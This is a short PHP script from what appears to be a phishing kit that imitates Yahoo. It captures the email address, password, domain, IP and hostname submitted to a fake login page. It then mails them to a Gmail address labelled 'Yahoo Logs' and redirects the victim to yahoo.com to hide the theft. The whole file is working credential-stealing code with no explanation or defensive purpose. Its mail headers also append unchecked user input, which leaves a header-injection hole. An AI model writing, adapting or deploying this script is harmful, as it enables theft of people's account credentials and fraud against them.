<?php 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message  = "==================+[ Donslim ]+==================\n";
$message .= "Email Address       : ".$_POST['login']."\n";
$message .= "Password    : ".$_POST['passwd']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "Domain      : ".$_POST['domain']."\n";

$message .= "=============+ [ Donslim ] +=============\n";

$send= "williamjerk111@gmail.com";

$subject = " ................ !!|| $ip";
$headers = "From:  Yahoo Logs| <slim@xxx.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);

header("Location: http://yahoo.com/");
?>